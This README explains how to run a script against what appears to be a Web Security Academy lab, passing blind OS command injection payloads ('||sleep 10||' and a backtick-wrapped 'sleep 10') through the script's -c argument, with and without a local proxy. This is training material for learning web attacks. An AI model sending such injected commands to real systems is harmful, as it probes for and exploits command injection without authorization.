# How to run script.py

### 1. ||sleep 10||

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "test||sleep 10||"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "test||sleep 10||" -p 127.0.0.1:8080`

### 2. \`sleep 10\`

No proxy:
- python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "test\\\`sleep 10\\\`"

Proxy:
- python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "test\\\`sleep 10\\\`" -p 127.0.0.1:8080
